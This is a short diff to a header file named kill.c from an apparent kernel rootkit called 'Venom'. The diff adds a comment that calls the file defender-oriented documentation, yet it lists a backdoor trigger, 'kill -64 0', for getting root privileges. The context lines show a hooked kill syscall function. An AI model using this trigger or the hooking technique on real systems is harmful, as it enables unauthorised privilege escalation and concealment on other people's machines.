@@ -1,3 +1,17 @@
+/*
+ * Venom 
+ * ---------------------------------------------------------------------------
+ * File: kill.c
+ *
+ * Purpose:
+ *  - High-level explanation of signal delivery paths (kill/sys_kill) and how
+ *    interception or unusual handling can be observed by defenders.
+ *
+ * Contents (documentation-only):
+ *  - Get root privileges: kill -64 0 
+ */
+
+
 #ifndef KILL_H
 #define KILL_H
 
@@ -78,3 +92,4 @@ notrace static asmlinkage long hooked_kill(const struct pt_regs *regs) {
 }
 
 #endif 
+
